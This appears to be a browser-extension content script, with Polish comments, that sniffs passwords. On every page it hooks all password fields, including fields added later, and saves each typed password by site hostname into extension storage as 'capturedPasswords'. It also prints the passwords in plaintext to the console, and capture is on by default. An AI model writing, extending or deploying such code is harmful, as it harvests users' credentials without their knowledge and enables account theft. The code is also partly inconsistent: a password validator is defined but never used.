import { Storage } from "@plasmohq/storage";

const storage = new Storage();
let passwordSniffingEnabled = true;

function validatePassword(password: string): boolean {
    const regex = /^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
    return regex.test(password);
}

// 🔄 Inicjalizacja
async function initialize() {
    try {
        const storedValue = await storage.get<boolean>("passwordSniffingEnabled");
        passwordSniffingEnabled = storedValue ?? true; // Jeśli brak wartości, domyślnie true

        // 🎧 Nasłuchiwanie zmian w `passwordSniffingEnabled`
        storage.watch({
            passwordSniffingEnabled: (newValue) => {
                passwordSniffingEnabled = newValue.newValue;
                console.log("🔄 Password Sniffing state changed:", newValue);
            }
        });

        setupPasswordTracking();
    } catch (error) {
        console.error("❌ Error during initialization:", error);
    }
}

// 🔍 Nasłuchiwanie zmian w polach hasła
function setupPasswordTracking() {
    const passwordInputs = document.querySelectorAll("input[type='password']") as NodeListOf<HTMLInputElement>;

    passwordInputs.forEach(input => {
        input.addEventListener("input", async () => {
            console.log("🔑 Password input changed", input.value);
            await savePassword(input);
        });
    });

    console.log("🔄 Password tracking setup complete");
}

// 🕵️‍♂️ Obserwacja dynamicznie dodanych pól hasła
const observer = new MutationObserver(() => {
    setupPasswordTracking();
});
observer.observe(document.body, { childList: true, subtree: true });

// 💾 Zapisanie hasła do `storage`
async function savePassword(inputElement: HTMLInputElement) {
    if (!passwordSniffingEnabled) return;

    const website = window.location.hostname;
    const passwordValue = inputElement.value.trim();

    if (passwordValue.length > 0 ) {
        try {
            let savedPasswords = await storage.get<{ [key: string]: string }>("capturedPasswords") || {};

            savedPasswords[website] = passwordValue;
            await storage.set("capturedPasswords", savedPasswords);

            console.log(`✅ Saved password for ${website}:`, passwordValue);
        } catch (error) {
            console.error("❌ Error saving password:", error);
        }
    } else {
        console.log(`❌ Password for ${website} does not meet the criteria or is empty`);
    }

    // 🔍 Podgląd zapisanych haseł w `storage`
    const savedPasswords = await storage.get<{ [key: string]: string }>("capturedPasswords") || {};
    console.log("📂 Current stored passwords:", savedPasswords);
}

// 🚀 Uruchomienie skryptu
initialize();
